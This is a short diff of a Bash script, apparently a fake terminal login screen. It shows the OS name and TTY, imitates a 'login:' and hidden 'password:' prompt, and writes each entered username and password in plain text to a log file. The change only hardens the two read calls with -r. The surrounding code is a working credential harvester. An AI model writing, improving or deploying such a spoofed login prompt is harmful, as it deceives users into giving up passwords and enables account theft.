@@ -19,8 +19,8 @@ TTY=$(tty | sed 's/\/dev\///')
 
 for ((i=1; i<=INTENTOS; i++)); do
     echo -e "$OS_NAME $TTY\n"
-    read -p "$OSTYPE login: " usuario
-    read -s -p "password: " contrasena
+    read -r -p "$OSTYPE login: " usuario
+    read -r -s -p "password: " contrasena
     echo
 
     echo "$(date '+%Y-%m-%d %H:%M:%S') - Usuario: $usuario, Password: $contrasena" >> "$LOGS"
